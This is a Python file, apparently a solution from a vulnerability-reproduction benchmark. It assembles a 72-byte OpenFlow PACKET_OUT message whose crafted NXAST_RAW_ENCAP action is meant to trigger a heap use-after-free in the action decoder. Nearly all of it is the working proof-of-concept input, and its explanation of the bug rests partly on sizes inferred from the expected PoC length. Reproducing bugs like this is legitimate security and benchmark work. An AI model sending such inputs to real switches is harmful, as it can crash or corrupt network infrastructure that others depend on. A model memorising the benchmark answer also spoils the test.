import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap use-after-free in the decoding of OpenFlow
        NXAST_RAW_ENCAP actions. It occurs when an internal buffer ('out') used to
        store the decoded representation of actions is reallocated during the
        processing of encapsulation properties. A pointer ('encap') to the old,
        freed buffer is subsequently used, leading to a crash.

        To trigger this, the PoC is crafted to manipulate the state of the 'out'
        buffer. Based on the ground-truth PoC length of 72 bytes, it is inferred
        that the 'out' buffer is initialized with a small size, likely 32 bytes.
        The PoC contains a single NXAST_RAW_ENCAP action with two properties:
        1. A "filler" property (OFPPPT_BASIC) that, when decoded, expands in size
           and fills the 'out' buffer up to a critical point. On the wire, this
           property is 8 bytes, but it decodes into a 16-byte structure.
        2. A "trigger" property (OFPPPT_EXP_ENET_DST) whose decoding process
           involves multiple writes to the 'out' buffer. The first write succeeds,
           filling the buffer completely. The second write overflows the buffer's
           capacity, triggering a reallocation.

        This sequence of events causes the 'encap' pointer to become stale, and a
        subsequent write through it results in a use-after-free. The lengths of
        all headers and properties are calculated precisely to fit within a total
        PoC size of 72 bytes.
        """
        
        # OpenFlow Header (8 bytes)
        # version=4, type=OFPT_PACKET_OUT(13), length=72, xid=0
        header = struct.pack('!BBHI', 0x04, 0x0d, 72, 0)

        # OFPT_PACKET_OUT message (16 bytes)
        # buffer_id=NO_BUFFER, in_port=CONTROLLER, actions_len=48
        packet_out = struct.pack('!IIH', 0xffffffff, 0xfffffffd, 48) + (b'\x00' * 6)

        # Action: Vendor Header (8 bytes)
        # type=OFPAT_VENDOR, len=48, vendor=NX_VENDOR_ID
        vendor_header = struct.pack('!HHI', 0xffff, 48, 0x00002320)

        # Action Body: NXAST_RAW_ENCAP (40 bytes total)
        # 1. Header (12 bytes)
        #    subtype=NXAST_RAW_ENCAP(37), len=40
        encap_header = struct.pack('!HHHHB', 37, 40, 0x0001, 0x0001, 0) + (b'\x00' * 3)

        # 2. Filler Property: OFPPPT_BASIC (8 bytes on wire)
        #    type=OFPPPT_BASIC(0), length=8
        prop_basic = struct.pack('!HHI', 0x0000, 8, 0)

        # 3. Trigger Property: OFPPPT_EXP_ENET_DST (16 bytes on wire)
        #    type=OFPPPT_EXP_ENET_DST(0xfffd), length=16, exp_type=2
        prop_exp_enet = (
            struct.pack('!HHH', 0xfffd, 16, 0x0002)
            + b'\x00' * 2  # pad
            + b'\x00' * 6  # eth_addr
            + b'AA'        # data payload
        )

        # 4. Padding (4 bytes)
        #    The total length of properties (8+16=24) plus the encap header (12) is 36.
        #    The encap struct length must be a multiple of 8, so we pad to 40 bytes.
        padding = b'\x00' * 4

        action_body = encap_header + prop_basic + prop_exp_enet + padding

        # Assemble the full PoC
        poc = header + packet_out + vendor_header + action_body

        return poc